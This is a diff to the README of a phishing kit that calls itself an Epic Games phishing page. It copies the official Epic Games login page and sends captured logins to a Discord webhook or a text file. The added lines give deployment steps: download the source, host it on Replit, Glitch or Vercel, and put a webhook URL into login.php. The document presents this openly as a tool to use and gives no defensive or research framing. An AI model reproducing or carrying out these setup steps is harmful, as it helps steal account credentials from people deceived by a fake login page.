@@ -20,6 +20,7 @@ Epic Games Phishing Page working with Discord webhook or save it on a .txt file.
 - Copy of the official Epic Game Login Page
 
 # ❓ - How to Setup ?
-1. take
-2. take
-4. take
+1. Download the Source code
+2. Upload it on a host like Replit, Glitch, Vercel (Im using Replit)
+4. Go in `login.php`, and put your webhook url. You can enable ping too.
+5. 
